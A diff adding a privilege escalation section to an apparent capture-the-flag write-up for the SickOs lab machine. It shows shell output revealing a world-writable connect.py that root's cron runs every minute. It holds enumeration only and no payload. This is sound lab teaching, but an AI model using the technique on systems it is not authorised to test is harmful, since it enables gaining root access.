@@ -108,13 +108,60 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
 ## 4.Privilege Escalation
 
+I navigated to `/var/www` and found a python file which is world writable :
 
+```text
+www-data@SickOs:/$ cd /var/www
+www-data@SickOs:/var/www$ ls -l
+total 16
+-rwxrwxrwx 1 root root  319 Sep 19 20:55 connect.py
+-rw-r--r-- 1 root root   21 Dec  5  2015 index.php
+-rw-r--r-- 1 root root   45 Dec  5  2015 robots.txt
+drwxr-xr-x 5 root root 4096 Dec  5  2015 wolfcms
+```
 
+and the content of the file is interesting :
 
+```python
+#!/usr/bin/python
 
+print "I Try to connect things very frequently\n"
+print "You may want to try my services"
+```
 
+as it says here that does execute the program `frequently`, i guessed maybe there is a cronjob for it on the system
+
+just check the cronjobs :
+
+```text
+www-data@SickOs:/var/www$ ls /etc/cron*
+/etc/crontab
+
+/etc/cron.d:
+automate  php5
+
+/etc/cron.daily:
+apache2  apt       bsdmainutils  logrotate  mlocate  popularity-contest  update-notifier-common
+apport   aptitude  dpkg          man-db     passwd   standard
+
+/etc/cron.hourly:
+
+/etc/cron.monthly:
+
+/etc/cron.weekly:
+apt-xapian-index  man-db
+```
+
+yes, there is a `automate` file in `cron.d` that executes the connect.py
+
+```text
+www-data@SickOs:/var/www$ cat /etc/cron.d/automate 
+
+* * * * * root /usr/bin/python /var/www/connect.py
+```
 
 
 
